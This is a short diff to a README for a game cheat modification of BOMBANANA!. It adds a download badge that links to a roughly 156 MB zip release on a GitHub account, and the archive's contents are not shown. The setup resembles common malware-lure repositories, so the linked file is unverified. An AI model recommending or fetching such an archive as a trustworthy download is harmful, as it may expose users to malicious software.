@@ -6,6 +6,15 @@
 
 A community-made modification for **BOMBANANA!** featuring gameplay customization, visual tools, movement settings and experimental features for offline and private sessions.
 
+### ⬇️ Download
+
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Lowercladisconnect/BOMBANANA-Cheats/releases/download/v1.0.0/BOMBANANA.CHEATS.zip)
+
+Latest Version: v1.0.0 • File Size: ~156 MB
+
+</div>
+
+
 > ⚠️ Designed for offline, private and testing environments.
 
 ---
